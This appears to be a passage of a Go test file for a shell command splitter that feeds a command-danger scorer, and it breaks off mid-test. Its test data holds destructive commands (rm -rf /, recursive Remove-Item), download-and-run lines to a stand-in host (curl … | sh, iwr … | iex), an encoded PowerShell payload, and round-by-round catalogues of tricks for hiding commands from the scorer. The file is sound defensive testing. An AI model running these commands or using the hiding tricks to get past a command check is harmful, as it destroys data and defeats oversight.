package shellsplit

import (
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"
)

func check(t *testing.T, d Dialect, cases []struct {
	in   string
	want []string
}) {
	t.Helper()
	for _, c := range cases {
		if got := Split(d, c.in); !reflect.DeepEqual(got, c.want) {
			t.Errorf("Split(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

func TestSh(t *testing.T) {
	check(t, Sh, []struct {
		in   string
		want []string
	}{
		// The reported call: a heredoc's body is data, the rm stays its own command.
		{"rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'\n# Lab Report\nrm is mentioned here\nEOF", []string{"rm -rf quotesdemo", "cat > LAB_REPORT.md << 'EOF'"}},
		{"cat <<-END\n\tbody; rm -rf /\n\tEND\necho done", []string{"cat <<-END", "echo done"}},
		{"a; b && c || d | e |& f & g", []string{"a", "b", "c", "d", "e", "f", "g"}},
		{"a\nb", []string{"a", "b"}},
		{"echo 'a'; rm -rf x", []string{"echo 'a'", "rm -rf x"}}, // the closing quote closes
		{"printf '%s' \"x\" && rm -rf y", []string{"printf '%s' \"x\"", "rm -rf y"}},
		{`echo "x; y" 'p && q' a\;b`, []string{`echo "x; y" 'p && q' a\;b`}},
		{"make 2>&1 | tee log", []string{"make 2>&1", "tee log"}},
		{"cmd &> out.txt", []string{"cmd &> out.txt"}},
		{"ls # ; rm -rf x\necho ok", []string{"ls", "echo ok"}},
		{"echo a#b", []string{"echo a#b"}},
		{"echo $(rm -rf x; ls)", []string{"echo $(rm -rf x; ls)", "rm -rf x", "ls"}},
		{"echo `rm -rf x`", []string{"echo `rm -rf x`", "rm -rf x"}},
		{`echo "in $(rm -rf x)"`, []string{`echo "in $(rm -rf x)"`, "rm -rf x"}},
		{"(cd sub && rm -rf build)", []string{"cd sub", "rm -rf build"}},
		{"{ rm -rf x; }", []string{"rm -rf x"}},
		{"echo ${HOME}/x", []string{"echo ${HOME}/x"}},
		{"ls \\\n  -la", []string{"ls   -la"}},
		{"echo 'unclosed ; rm", []string{"echo 'unclosed ; rm"}},
	})
}

func TestPowerShell(t *testing.T) {
	check(t, PowerShell, []struct {
		in   string
		want []string
	}{
		{"Remove-Item -Recurse x; Get-ChildItem", []string{"Remove-Item -Recurse x", "Get-ChildItem"}},
		{"a && b || c | d", []string{"a", "b", "c", "d"}},
		{"& 'C:\\tools\\x.exe' -y", []string{"& 'C:\\tools\\x.exe' -y"}}, // & calls, it doesn't separate
		{"Write-Host 'it''s; fine'", []string{"Write-Host 'it''s; fine'"}},
		{"Write-Host \"a`;b\"", []string{"Write-Host \"a`;b\""}},
		{"Get-Date # ; Remove-Item -Recurse C:\\", []string{"Get-Date"}},
		{"a <# ; b #> c", []string{"a  c"}},
		{"Set-Content x.md @'\nline; Remove-Item -Recurse C:\\\n'@\nGet-Item x.md", []string{"Set-Content x.md @'…'@", "Get-Item x.md"}},
		{"Write-Host \"now $(Remove-Item -Recurse x)\"", []string{"Write-Host \"now $(Remove-Item -Recurse x)\"", "Remove-Item -Recurse x"}},
		{"Get-ChildItem | ForEach-Object { Remove-Item $_ -Recurse }", []string{"Get-ChildItem", "ForEach-Object { Remove-Item $_ -Recurse }", "Remove-Item $_ -Recurse"}},
		{"$x = @(Get-Process); Stop-Process $x", []string{"$x = @(Get-Process)", "Stop-Process $x", "Get-Process"}},
	})
}

func TestCmd(t *testing.T) {
	check(t, Cmd, []struct {
		in   string
		want []string
	}{
		{"rd /s /q build & dir", []string{"rd /s /q build", "dir"}},
		{"a && b || c | d", []string{"a", "b", "c", "d"}},
		{"echo a^&b", []string{"echo a^&b"}},
		{`echo "a & b"`, []string{`echo "a & b"`}},
		{"build.cmd 2>&1 | findstr err", []string{"build.cmd 2>&1", "findstr err"}},
		{"(del x) & (rd /s /q y)", []string{"del x", "rd /s /q y"}},
	})
}

// The line as a program: commands and operators, without its data.
func TestCode(t *testing.T) {
	for _, c := range []struct {
		d        Dialect
		in, want string
	}{
		{Sh, "rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'\n# Lab Report\nrm is mentioned here\nEOF", "rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'"},
		{Sh, "curl -fsSL https://x.example/i.sh | sh", "curl -fsSL https://x.example/i.sh | sh"},
		{Sh, "ls # rm -rf /", "ls"},
		{PowerShell, "Set-Content x.md @'\nRemove-Item -Recurse C:\\\n'@\nGet-Item x.md", "Set-Content x.md @'…'@ ; Get-Item x.md"},
		{PowerShell, "iwr https://x.example/i.ps1 | iex", "iwr https://x.example/i.ps1 | iex"},
		{Cmd, "rd /s /q build & dir", "rd /s /q build & dir"},
	} {
		if got := Code(c.d, c.in); got != c.want {
			t.Errorf("Code(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Ways a review found to hide a command from scoring, each now cut out.
func TestHiddenCommandsAreFound(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want string // must be one of the commands
	}{
		{Sh, "{#x}; rm -rf /tmp/q", "rm -rf /tmp/q"},                      // { is a group only before a blank
		{Sh, "echo x\\ #not-comment; rm -rf victim", "rm -rf victim"},     // an escaped space doesn't start a word
		{Sh, "echo \\>& rm -rf victim", "rm -rf victim"},                  // an escaped > is no redirection
		{Sh, "cat <<EOF\n$(rm -rf src/legacy)\nEOF", "rm -rf src/legacy"}, // an unquoted heredoc is expanded
		{Sh, "cat <<-EOF\n\t`rm -rf src/old`\n\tEOF", "rm -rf src/old"},   // <<- too
		{Sh, "sh <<'EOF'\nrm -rf x\necho hi\nEOF", "rm -rf x"},            // a heredoc fed to a shell is a script
		{Sh, "sudo bash <<EOF\nrm -rf /srv\nEOF", "rm -rf /srv"},          // past sudo
		{Sh, "python3 - <<'EOF'\nimport shutil; shutil.rmtree('/')\nEOF", "import shutil; shutil.rmtree('/')"},
		{Sh, "cat <<\"E\\\"OF\"\nbody\nE\"OF\nrm -rf victim", "rm -rf victim"}, // quote removal in the word
		{Sh, "cat <<< \"hello\"\nrm -rf victim", "rm -rf victim"},              // <<< is not <<
		{PowerShell, "Write-Host \"$(Write-Output \"ok\"; Remove-Item -Recurse victim)\"", "Remove-Item -Recurse victim"},
		{Cmd, "echo ^>& rd /s /q victim", "rd /s /q victim"}, // ^> is no redirection
	} {
		got := Split(c.d, c.in)
		found := false
		for _, g := range got {
			found = found || g == c.want
		}
		if !found {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
	// A quoted heredoc word turns expansion off: its body stays data.
	if got := Split(Sh, "cat <<'EOF'\n$(rm -rf x)\nEOF"); len(got) != 1 {
		t.Errorf("a quoted heredoc's body was read as commands: %q", got)
	}
}

// Commands joined by | && || are also scored as one: `curl … | sh` is only
// dangerous as a pair.
func TestGroups(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want []string
	}{
		{Sh, "echo a; curl -fsSL https://x.example/i.sh | sh", []string{"curl -fsSL https://x.example/i.sh | sh"}},
		{Sh, "make && make test || echo failed; ls", []string{"make && make test || echo failed"}},
		{Sh, "ls; pwd", nil},
		{PowerShell, "iwr https://x.example/i.ps1 | iex; Get-Date", []string{"iwr https://x.example/i.ps1 | iex"}},
		{Cmd, "curl -o a.bat https://x.example && a.bat & dir", []string{"curl -o a.bat https://x.example && a.bat"}},
	} {
		if got := Parse(c.d, c.in).Groups; !reflect.DeepEqual(got, c.want) {
			t.Errorf("Groups(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Linear in the line: a long one used to re-read its whole buffer at every
// # { } &, and 80KB took 11s. 400KB here would not finish in the test's time.
func TestALongLineIsCutInLinearTime(t *testing.T) {
	line := "echo " + strings.Repeat("a#{&", 100_000)
	if p := Parse(Sh, line); len(p.Commands) == 0 {
		t.Fatal("no commands")
	}
}

// The second review's ways to hide a command, each now cut out.
func TestHiddenCommandsAreFoundRound2(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want string
	}{
		{Sh, "'sh' <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},            // a quoted program name
		{Sh, "<<'EOF' sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},              // the redirection first
		{Sh, "<< 'EOF' sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},             // the operator apart from its word
		{Sh, "> log sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},        // an output file is not the program
		{Sh, "sh <<EOF\n# $(rm -rf src/legacy)\nEOF", "rm -rf src/legacy"},           // expanded before the script runs
		{Sh, "timeout 5 sh <<EOF\nrm -rf x\nEOF", "rm -rf x"},                        // past a wrapper's argument
		{Sh, "ssh deploy@host <<'EOF'\nrm -rf /srv/app\nEOF", "rm -rf /srv/app"},     // a script for another host
		{Sh, "echo $(printf x)#not-comment; rm -rf src/legacy", "rm -rf src/legacy"}, // a ) starts no word
		{Sh, "cat <<EO\\\nF\nbody\nEOF\nrm -rf victim", "rm -rf victim"},             // continuation in the word
		{Sh, "cat <<EOF\nbody\nEO\\\nF\nrm -rf victim", "rm -rf victim"},             // continuation in the terminator
		{Sh, "sh -c 'echo hi; rm -rf /tmp/q'", "rm -rf /tmp/q"},
		{Sh, "bash -lc \"cd x && rm -rf build\"", "rm -rf build"},
		{Sh, "pwsh -Command \"Remove-Item -Recurse x\"", "Remove-Item -Recurse x"},
		{PowerShell, "cmd /c \"rd /s /q build\"", "rd /s /q build"},
		{Cmd, "cmd /c rd /s /q build & dir", "rd /s /q build"},
		{Sh, "python3 -c 'import shutil; shutil.rmtree(\"/\")'", "import shutil; shutil.rmtree(\"/\")"},
		{Sh, "eval 'rm -rf x'", "rm -rf x"},
	} {
		got := Split(c.d, c.in)
		found := false
		for _, g := range got {
			found = found || g == c.want
		}
		if !found {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
}

// The third review's ways to hide a command, each now cut out.
var hiddenRound3 = []struct {
	d    Dialect
	in   string
	want string
}{
	{Sh, "cat <<EOF\ndata\\\\\nEOF\nrm -rf src/legacy", "rm -rf src/legacy"},          // an escaped backslash continues no line
	{Sh, "cat <<\"EO\\\nF\"\nbody\nEOF\nrm -rf src/legacy", "rm -rf src/legacy"},      // a continuation in a quoted word
	{Sh, "0<< 'EOF' sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},                 // a numbered redirection
	{Sh, "env -u FOO sh <<EOF\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},          // a wrapper's option and its value
	{Sh, "&>log sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},             // an attached &>
	{Sh, "sudo -u deploy sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},    // sudo -u
	{Sh, "timeout -s KILL 5 sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"}, // timeout -s
	{Sh, "xargs -a list.txt sh -c 'rm -rf src/legacy'", "rm -rf src/legacy"},          // xargs -a
	{Cmd, "cmd.exe /c \"rd /s /q build\"", "\"rd /s /q build\""},                      // cmd.exe
	{Cmd, "cmd /d /c rd /s /q build", "rd /s /q build"},                               // options before /c
	{PowerShell, "cmd.exe /d /c \"rd /s /q build\"", "rd /s /q build"},
}

func TestHiddenCommandsAreFoundRound3(t *testing.T) {
	for _, c := range hiddenRound3 {
		got := Split(c.d, c.in)
		if !slices.Contains(got, c.want) {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
}

// encoded is -EncodedCommand's form of Remove-Item -Recurse -Force C:\src\app:
// base64 of its UTF-16LE.
const encoded = "UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXABzAHIAYwBcAGEAcABwAA=="

// The fourth review's ways to hide a command, each now cut out.
var hiddenRound4 = []struct {
	d    Dialect
	in   string
	want string
}{
	{Sh, "2>&1 sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"}, // a complete redirection takes no operand
	{Sh, "0<&0 sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},
	{Sh, "python3 - sh <<'EOF'\nimport shutil\nshutil.rmtree('x')\nEOF", "import shutil\nshutil.rmtree('x')"}, // a match adds, never takes away
	{Sh, "cat <<'EOF' | sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},                                     // piped into a shell
	{Sh, "cat <<'EOF' | tee log | sudo bash\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},
	{Sh, "sh<<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"}, // attached
	{Sh, "/bin/bash>log <<EOF\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},
	{Sh, "python3<<'EOF'\nimport shutil; shutil.rmtree('x')\nEOF", "import shutil; shutil.rmtree('x')"},
	{PowerShell, "powershell -EncodedCommand " + encoded, "Remove-Item -Recurse -Force C:\\src\\app"}, // base64 UTF-16LE
	{PowerShell, "pwsh -enc " + encoded, "Remove-Item -Recurse -Force C:\\src\\app"},
	{Cmd, "powershell /e " + encoded, "Remove-Item -Recurse -Force C:\\src\\app"},
}

func TestHiddenCommandsAreFoundRound4(t *testing.T) {
	for _, c := range hiddenRound4 {
		got := Split(c.d, c.in)
		if !slices.Contains(got, c.want) {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
}

// A script that can't be read — -EncodedCommand that isn't base64 of UTF-16,
// a heredoc piped on to a line not yet read — makes the parse incomplete.
func TestUnreadableCodeIsIncomplete(t *testing.T) {
	for _, line := range []string{"powershell -enc not-base64!", "cat <<EOF |\nrm -rf x\nEOF\nsh"} {
		if p := Parse(Sh, line); !p.Incomplete {
			t.Errorf("Parse(%q) complete: %q", line, p.Commands)
		}
	}
	if p := Parse(Sh, "cat <<EOF | grep x\nbody\nEOF"); p.Incomplete {
		t.Error("a heredoc piped into grep marked incomplete")
	}
}

// One pass over a command's words: a line naming an interpreter in every word
// costs no more than one that names none.
func TestManyInterpreterWordsAreLinear(t *testing.T) {
	line := "echo " + strings.Repeat("sh ", 200000)
	done := make(chan struct{})
	go func() { Parse(Sh, line); close(done) }()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("200000 words naming sh took over 5s")
	}
}

// A heredoc is data only for a program known to read data; any other reader
// may run it, and the parse says it is incomplete. Interpreters, versioned or
// not, have it scored.
func TestAHeredocsReaderDecidesWhatItIs(t *testing.T) {
	for _, line := range []string{
		"cat > notes.md <<'EOF'\nrm is mentioned here\nEOF",
		"git commit -F - <<'EOF'\nmsg\nEOF",
		"git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"",
		": <<'EOF'\na comment\nEOF",
		"cat <<EOF | grep x | sort\nbody\nEOF",
		"2>/dev/null cat >f <<EOF\nbody\nEOF",
		"LC_ALL=C sort <<EOF\nb\na\nEOF",
		"echo $((1+2)); cat > f <<'EOF'\nx\nEOF", "arr=(); arr+=(x); cat > f <<'EOF'\nx\nEOF", // arithmetic defines no function
		"exec >log; cat > f <<'EOF'\nx\nEOF",            // exec to a file
		"eval $(ssh-agent -s); cat > f <<'EOF'\nx\nEOF", // a substitution, scored
		"sh -c 'coproc sh'; cat > f <<'EOF'\nx\nEOF",    // a coproc in another shell
		"timeout 5 sh <<EOF\nrm -rf x\nEOF",             // a wrapper, but sh reads it, and it is scored
		"sudo -u deploy bash <<EOF\nrm -rf x\nEOF",
	} {
		if p := Parse(Sh, line); p.Incomplete {
			t.Errorf("Parse(%q): a data reader's heredoc marked incomplete", line)
		}
	}
	for _, line := range []string{
		"psql mydb <<'EOF'\nDROP TABLE users;\nEOF",
		"$SH <<'EOF'\nrm -rf x\nEOF",
		"cat <<'EOF' | xargs rm -rf\nsrc\nEOF",
		"tee >(sh) <<'EOF'\nrm -rf x\nEOF",
		"sudo -s <<'EOF'\nrm -rf x\nEOF",
		"sed -f - x.txt <<'EOF'\ns/a/b/\nEOF",
		"while read l; do :; done <<'EOF'\nx\nEOF",
		"awk '{ system($0) }' <<'EOF'\nrm -rf x\nEOF", // awk runs lines: system
		"sed 's/.*/&/e' <<'EOF'\nrm -rf x\nEOF",       // sed runs lines: e
		"patch -p1 <<'EOF'\n--- /dev/null\n+++ b/x\nEOF",
		"git apply <<'EOF'\n--- a/x\n+++ b/x\nEOF",
		"git apply<<'EOF'\n--- a/x\n+++ b/x\nEOF",
		"git update-ref --stdin <<'EOF'\nupdate refs/heads/main 0000\nEOF",
		"(\ncat <<'EOF'\nrm -rf x\nEOF\n) | sh", // a block still open: its reader isn't known yet
		"if true\nthen\ncat <<'EOF'\nrm -rf x\nEOF\nfi | sh",
		"for i in 1\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
		"while true; do\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
		"until false\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
		"time if true\nthen\ncat <<'EOF'\nrm -rf x\nEOF\nfi | sh",
		"for ((i=0;i<1;i++))\ndo\ncat <<'EOF'\nrm -rf x\nEOF\ndone | sh",
		"cat <<'EOF' | { :;\nrm -rf x\nEOF\nsh; }", // piped into a block not closed on its line
		"exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF", // exec: all written after it goes there
		"FOO=bar exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
		"command -p exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
		"coproc sh; cat <<'EOF' >&${COPROC[1]}\nrm -rf x\nEOF", // a descriptor set up earlier
		"f () { cat <<'EOF'; }\nrm -rf x\nEOF\nf | sh",         // a function called later
		"function f { cat <<'EOF'; }\nrm -rf x\nEOF\nf | sh",
		"sh <(cat <<'EOF')\nrm -rf x\nEOF",             // an input process substitution, read as a file
		"\"exec\" > >(sh); cat <<'EOF'\nrm -rf x\nEOF", // quoted, still exec
		"\\exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
		"command \"exec\" > >(sh); cat <<'EOF'\nrm -rf x\nEOF",
		"eval 'coproc sh'; cat <<'EOF' >&${COPROC[1]}\nrm -rf x\nEOF", // eval sets it up in this shell
		"read -r -d '' x <<'EOF'; eval \"$x\"\nrm -rf x\nEOF",         // eval runs a value not on the line
		"alias cat=sh; cat <<'EOF'\nrm -rf x\nEOF",
		"command alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF", // alias however it is written
		"\"alias\" cat=sh\ncat <<'EOF'\nrm -rf x\nEOF",
		">log alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF",
		"> log alias cat=sh\ncat <<'EOF'\nrm -rf x\nEOF", // an operator and its operand before it
		">log exec > >(sh); cat <<'EOF'\nrm -rf x\nEOF",  // exec past a redirection
		"exec> >(sh); cat <<'EOF'\nrm -rf x\nEOF",
		"read -r -d '' x <<'EOF'; e=eval; $e \"$x\"\nrm -rf x\nEOF", // eval named by a variable
	} {
		if p := Parse(Sh, line); !p.Incomplete {
			t.Errorf("Parse(%q) = %q: an unknown reader's heredoc marked complete", line, p.Commands)
		}
	}
	for line, want := range map[string]string{
		"python3.11 <<'EOF'\nimport shutil; shutil.rmtree('x')\nEOF": "import shutil; shutil.rmtree('x')",
		"ksh93 <<'EOF'\nrm -rf x\nEOF":                               "rm -rf x",
		"/usr/bin/perl5.38 - <<'EOF'\nunlink 'x';\nEOF":              "unlink 'x';",
	} {
		if got := Split(Sh, line); !slices.Contains(got, want) {
			t.Errorf("Split(%q) = %q — %q is not among them", line, got, want)
		}
	}
	if got := Split(Cmd, `"powershell" /e `+encoded); !slices.Contains(got, `Remove-Item -Recurse -Force C:\src\app`) {
		t.Errorf("a quoted program in cmd: %q", got)
	}
}

// What git, gh and PowerShell do with a heredoc or a here-string, and a body
// dropped as data that a variable runs later.
func TestHiddenCommandsAreFoundRound6(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		line string
	}{
		{Sh, "git -C repo commit -F - <<'EOF'\nmsg\nEOF"},
		{Sh, "git --no-pager log --stdin <<'EOF'\nHEAD\nEOF"},
		{Sh, "git log --oneline am>out <<'EOF'\nHEAD\nEOF"}, // a revision named am: the subcommand is log
		{Sh, "gh api repos/o/r/issues --input - <<'EOF'\n{}\nEOF"},
		{Sh, "gh pr create --body-file - <<'EOF'\nbody\nEOF"},
		{Sh, "cat > f <<'EOF'\nx\nEOF\nsh -c 'make all'"},  // nothing on the line runs a variable
		{Sh, "cat > f <<'EOF'\nx\nEOF\nmake $TARGET"},      // a variable as an argument, not the program
		{Sh, "LC_ALL=C git commit -F - <<'EOF'\nmsg\nEOF"}, // an assignment not for git
		{Sh, "sort -u <<'EOF'\nb\na\nEOF"},                 // sort with no program to run
		{PowerShell, "Set-Content notes.md @'\nRemove-Item is mentioned\n'@"},
		{PowerShell, "@'\nRemove-Item is mentioned\n'@ | Out-File notes.md"},
		{PowerShell, "$t = @'\nRemove-Item is mentioned\n'@\nSet-Content notes.md $t"},
		{PowerShell, "git commit -F - @'\nmsg\n'@"},
	} {
		p := Parse(c.d, c.line)
		if p.Incomplete || slices.ContainsFunc(p.Commands, func(s string) bool { return strings.Contains(s, "is mentioned") }) {
			t.Errorf("Parse(%d, %q) = %q incomplete=%v: data was scored or made incomplete", c.d, c.line, p.Commands, p.Incomplete)
		}
	}
	for _, line := range []string{
		"git -c alias.run='!sh' run <<'EOF'\nrm -rf x\nEOF", // an alias defined on the line
		"git -calias.run=!sh run <<'EOF'\nrm -rf x\nEOF",
		"git --config-env=alias.run=X run <<'EOF'\nrm -rf x\nEOF",
		"git -c core.editor=x commit -F - <<'EOF'\nrm -rf x\nEOF",
		"git myalias <<'EOF'\nrm -rf x\nEOF", // an alias set up before
		"gh myext <<'EOF'\nrm -rf x\nEOF",    // a gh extension
		"git apply <<'EOF'\n--- a/x\n+++ b/x\nEOF",
		"read -r x <<'EOF'\nrm -rf x\nEOF\ne=eval; $e \"$x\"", // a variable run after the body was read
		"read -r x <<'EOF'\nrm -rf x\nEOF\nsh -c \"$x\"",
		"read -r x <<'EOF'\nrm -rf x\nEOF\npython3 -c \"$x\"",
		"read -r x <<'EOF'\nrm -rf x\nEOF\nsh -c '$1' _ \"$x\"",
		"x=$(cat <<'EOF'\nrm -rf x\nEOF\n)\n$x", // dropped in a substitution, run by the line
		"read -r x <<'EOF'\nrm -rf x\nEOF\nf () { :; }",
		"read -r x <<'EOF'\nrm -rf x\nEOF\ny=$(e=eval; $e \"$x\")",        // run inside a substitution
		"read -r x <<'EOF'\nrm -rf x\nEOF\ne=eval; echo \"$($e \"$x\")\"", // seen only inside the substitution
		"git -ccore.hooksPath=h commit -F - <<'EOF'\nrm -rf x\nEOF",       // config attached to -c
		"sort --compress-program=sh -S 1K <<'EOF'\nrm -rf x\nEOF",         // sort pipes what it reads through a program
		"sort --compress=sh <<'EOF'\nrm -rf x\nEOF",                       // abbreviated, as GNU takes it
		"rg --pre=sh x <<'EOF'\nrm -rf x\nEOF",
		"git -ccore.editor=sh commit -e -F - <<'EOF'\nrm -rf x\nEOF", // an editor that runs the message
		"git commit --edit -F - <<'EOF'\nrm -rf x\nEOF",              // whatever core.editor is
		"GIT_EDITOR=sh git commit -e -F - <<'EOF'\nrm -rf x\nEOF",
		"GIT_CONFIG_PARAMETERS=\"'alias.log=!sh'\" git log <<'EOF'\nrm -rf x\nEOF",
		"gh pr create --editor <<'EOF'\nrm -rf x\nEOF",
	} {
		if p := Parse(Sh, line); !p.Incomplete {
			t.Errorf("Parse(%q) = %q: marked complete", line, p.Commands)
		}
	}
	// A bare variable is data; a member of one may be a call that runs it.
	for w, want := range map[string]bool{"$c": true, "$env:TEMP": true, "$c.Invoke()": false, "$ExecutionContext.InvokeCommand": false, "$": false} {
		if got := psDataCommand(w); got != want {
			t.Errorf("psDataCommand(%q) = %v, want %v", w, got, want)
		}
	}
	for _, c := range []struct {
		d    Dialect
		line string
		want string
	}{
		{Sh, "pwsh -NoProfile -File - <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF", "Remove-Item -Recurse -Force ./src"},
		{Sh, "pwsh -Command - <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF", "Remove-Item -Recurse -Force ./src"},
		{Sh, "powershell.exe <<'EOF'\nRemove-Item -Recurse -Force ./src\nEOF", "Remove-Item -Recurse -Force ./src"},
		{Sh, "cmd <<'EOF'\nrd /s /q C:\\src\nEOF", `rd /s /q C:\src`},
		{PowerShell, "iex @'\nRemove-Item -Recurse -Force ./src\n'@", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "Invoke-Expression @\"\nRemove-Item -Recurse -Force ./src\n\"@", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "@'\nRemove-Item -Recurse -Force ./src\n'@ | iex", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "@'\nRemove-Item -Recurse -Force ./src\n'@ | Out-String | iex", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "$c = @'\nRemove-Item -Recurse -Force ./src\n'@\n& ([scriptblock]::Create($c))", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "$c=@'\nRemove-Item -Recurse -Force ./src\n'@; iex $c", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "$c = @'\nRemove-Item -Recurse -Force ./src\n'@; $ExecutionContext.InvokeCommand.InvokeScript($c)", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "Set-Content x (iex @'\nRemove-Item -Recurse -Force ./src\n'@)", "Remove-Item -Recurse -Force ./src"},
		{PowerShell, "git -c alias.x='!sh' x @'\nrm -rf src\n'@", "rm -rf src"},
	} {
		if got := Split(c.d, c.line); !slices.Contains(got, c.want) {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.line, got, c.want)
		}
	}
}

// What round 6 missed: an editor opened by a bundled or abbreviated flag, a
// variable run by a wrapper or a compound command, code attached to its flag,
// a here-string read through a variable by a command not naming it, and a
// data command redefined.
func TestHiddenCommandsAreFoundRound7(t *testing.T) {
	read := "read -r x <<'EOF'\nrm -rf x\nEOF\n"
	for _, line := range []string{
		"git grep -e foo <<'EOF'\nx\nEOF", // -e is a pattern, not an editor, outside commit, tag, notes
		"rg --pretty foo <<'EOF'\nx\nEOF", // not --pre
		read + "sh -c 'echo hi' _ \"$x\"", // the code doesn't use its arguments
		"git commit -m \"- fixed\" -F - <<'EOF'\nmsg\nEOF",
		"git commit -am \"- fixed, the end\" <<'EOF'\nmsg\nEOF",
		"exec > \"$LOG\" 2>&1\ncat > f <<'EOF'\nx\nEOF", // a redirection, not a program
		"exec >\"$LOG\" 2>&1\ncat > f <<'EOF'\nx\nEOF",
	} {
		if p := Parse(Sh, line); p.Incomplete {
			t.Errorf("Parse(%q) = %q: marked incomplete", line, p.Commands)
		}
	}
	for _, line := range []string{
		"git commit -ae <<'EOF'\nrm -rf x\nEOF",
		"git commit -eF - <<'EOF'\nrm -rf x\nEOF",
		"git commit --e -F - <<'EOF'\nrm -rf x\nEOF",
		"git commit --edi -F - <<'EOF'\nrm -rf x\nEOF",
		"git commit -t /dev/stdin <<'EOF'\nrm -rf x\nEOF", // a template opens the editor too
		"git commit --templ=/dev/stdin <<'EOF'\nrm -rf x\nEOF",
		"git tag -a -eF - v1 <<'EOF'\nrm -rf x\nEOF",
		"git notes add -eF - <<'EOF'\nrm -rf x\nEOF",
		read + "exec $x",
		read + "env $x",
		read + "sudo $x",
		read + "timeout 5 $x",
		read + "nice -n 5 $x",
		read + "ssh host $x",
		read + "if true; then $x; fi",
		read + "while :; do $x; done",
		read + "python3 -c\"$x\"",
		read + "python3 -c'import os; os.system(\"'$x'\")'",
		read + "node --eval=\"$x\"",
		read + "python3 -Ic \"$x\"",
		read + "perl -le \"$x\"",
	} {
		if p := Parse(Sh, line); !p.Incomplete {
			t.Errorf("Parse(%q) = %q: marked complete", line, p.Commands)
		}
	}
	for line, want := range map[string]string{
		"perl -ne 'print if /x/' f":    "print if /x/",
		"python3 -c'print(1)'":         "print(1)",
		"node --eval='process.exit()'": "process.exit()",
	} {
		if got := Split(Sh, line); !slices.Contains(got, want) {
			t.Errorf("Split(%q) = %q — %q is not among them", line, got, want)
		}
	}
	if got := Split(Sh, "python3 -Wignore app.py"); slices.Contains(got, "app.py") {
		t.Errorf("a value of -W taken for code: %q", got)
	}
	body := "\nRemove-Item -Recurse -Force ./src\n'@"
	for _, line := range []string{
		"$c = @'" + body + "\n$c | iex",
		"$c = @'" + body + "\niex (Get-Variable c -ValueOnly)",
		"$c = @'" + body + "\niex ${variable:c}",
		"$c = @'" + body + "; whoami", // anything may read it
		"Set-Alias sc iex\nsc @'" + body,
		"Set-Item alias:sc iex\nsc @'" + body,
		"function Set-Content { iex $args[0] }\nSet-Content @'" + body,
	} {
		if got := Split(PowerShell, line); !slices.Contains(got, "Remove-Item -Recurse -Force ./src") {
			t.Errorf("Split(PowerShell, %q) = %q: the here-string isn't scored", line, got)
		}
	}
}

// A block's output piped into a shell runs the heredocs read inside it.
func TestAHeredocInABlockIsReadByWhatTheBlockIsPipedInto(t *testing.T) {
	for _, line := range []string{
		"(cat <<'EOF') | sh\nrm -rf src/legacy\nEOF",
		"{ cat <<'EOF'; } | sh\nrm -rf src/legacy\nEOF",
		"(cat <<'EOF'; echo hi) | sh\nrm -rf src/legacy\nEOF",
		"case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF",
		"( (cat <<'EOF') ) |& bash\nrm -rf src/legacy\nEOF",
		"(cat <<'EOF') 2>/dev/null | sh\nrm -rf src/legacy\nEOF", // a redirection between
		"((cat <<'EOF') | sh) | grep x\nrm -rf src/legacy\nEOF",  // nested: each pipe adds a reader
